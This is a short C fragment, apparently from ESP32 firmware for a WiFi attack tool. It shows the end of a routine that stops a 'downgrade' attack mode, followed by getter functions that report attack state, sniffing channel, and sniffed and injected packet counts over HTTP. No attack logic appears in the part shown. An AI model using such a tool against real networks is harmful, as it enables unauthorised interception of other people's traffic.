    rgb_led_set_status(RGB_IDLE);

    printf("META,WIFI,DOWNGRADE,STOP,ok,1\n");
    fflush(stdout);
    return ESP_OK;
}


/* 外部 getter (HTTP 用) */
int wifi_atk_state_val(void)       { return (int)atomic_load(&s_state); }
uint8_t wifi_atk_channel(void)     { return (uint8_t)atomic_load(&s_sniff_channel); }
bool wifi_atk_auto_ch(void)        { return atomic_load(&s_channel_rotate); }
uint32_t wifi_atk_sniff_total(void){ return (uint32_t)atomic_load(&s_sniff_total); }
uint32_t wifi_atk_inject_total(void){ return (uint32_t)atomic_load(&s_inject_total); }
